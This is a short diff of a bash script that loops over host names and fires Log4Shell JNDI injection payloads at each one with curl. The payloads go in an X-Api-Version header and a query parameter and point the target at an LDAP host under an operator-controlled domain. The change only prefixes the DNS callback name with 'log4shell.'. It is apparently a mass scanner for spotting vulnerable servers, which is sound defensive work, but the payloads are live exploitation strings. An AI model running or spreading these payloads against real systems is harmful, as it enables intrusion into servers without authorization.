@@ -3,7 +3,7 @@
 while read fqdn
 do
   echo "$fqdn"
-  DNS_QUERY=`echo "$fqdn" | sed -e "s|:.*$||g"`.$DOMAIN
+  DNS_QUERY=log4shell.`echo "$fqdn" | sed -e "s|:.*$||g"`.$DOMAIN
   # http
   echo 'curl -s --max-time 3 http://$fqdn -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$DNS_QUERY/a}'|g" | sed "s|\$fqdn|$fqdn|g" | bash
   echo 'curl -s --max-time 3 '$fqdn/?test=log4jPayload' > /dev/null'     | sed "s|log4jPayload|'\$\\\{{jndi:ldap://$DNS_QUERY/a\\\}}'|g"        | sed "s|\$fqdn|$fqdn|g" | bash
